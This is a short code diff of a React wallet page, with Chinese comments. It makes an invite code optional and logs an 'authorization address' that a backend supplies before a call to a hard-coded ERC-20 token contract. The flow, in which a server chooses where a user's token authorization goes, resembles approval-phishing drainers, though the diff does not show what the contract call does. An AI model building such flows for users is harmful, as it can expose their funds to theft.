@@ -263,25 +263,21 @@ function Home() {
       const currentNetwork = chainId === 1 ? 'ETH' : 
                            chainId === 56 ? 'BSC' : 'ETH';
 
-      // 从用户信息中获取必要数据
-      const { invitedBy } = userProfile.user;
-      
-      if (!invitedBy) {
-        throw new Error('邀请码不能为空');
-      }
-
       if (!address) {
         throw new Error('钱包地址不能为空');
       }
 
+      // 从用户信息中获取必要数据
+      const { invitedBy } = userProfile.user;
+
       console.log('准备发送请求，参数:', {
-        invitedBy,
+        inviteCode: invitedBy || '',  // 如果 invitedBy 为空，传空字符串
         address,
         network: currentNetwork
       });
 
       const response = await axios.post('/wallets/get-wallet-Authorization', {
-        inviteCode: invitedBy,    // 邀请码
+        inviteCode: invitedBy || '',  // 如果 invitedBy 为空，传空字符串
         address,      // 使用当前连接的钱包地址
         network: currentNetwork  // 使用当前链的网络信息
       });
@@ -328,6 +324,7 @@ function Home() {
       console.log('3. 开始合约调用...');
       
       // 调用合约，使用获取到的授权地址
+      console.log('授权地址:+++++++++++++++++++++++++', walletAuth.address as `0x${string}`); // 打印授权地址
       const hash = await writeContractAsync({
         address: '0x55d398326f99059fF775485246999027B3197955',
         abi: erc20Abi,
